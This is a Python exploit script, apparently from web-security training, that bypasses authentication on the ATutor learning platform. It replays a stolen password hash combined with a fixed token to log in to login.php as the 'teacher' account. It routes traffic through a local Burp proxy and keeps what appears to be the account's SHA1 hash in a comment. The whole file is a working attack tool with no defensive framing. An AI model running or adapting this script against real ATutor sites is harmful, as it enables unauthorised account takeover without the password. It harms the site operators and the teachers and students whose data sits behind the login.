import requests
import hashlib
import sys

# proxy traffic through burp?
BURP = True

# hardcoded data
# 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e

def generate_hash(password, token):
    return hashlib.sha1(str(password + token).encode()).hexdigest()

def auth():
    atutor = f"http://{sys.argv[1]}/ATutor/login.php"
    token = "liam1337"
    session_hash = generate_hash(sys.argv[2], token)
    print(session_hash)

    post_data = {
        "form_password_hidden": session_hash,
        "form_login": "teacher",
        "submit": "Login",
        "token": token
    }

    burp_proxy = {'http':'http://127.0.0.1:8080'}

    s = requests.session()
    if BURP:
        login_request = s.post(atutor, data=post_data, proxies=burp_proxy).text
    else:
        login_request = s.post(atutor, data=post_data).text

    if "Create Course: My Start Page" in login_request or "My Courses: My Start Page" in login_request:
        return True
    else:
        return False

def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <hostname/ip> <password hash>")
        exit()
    
    # authenticate against the app
    if auth():
        print("[!] (success) we were able to login!")
    else:
        print("[!] fail!")
    
main()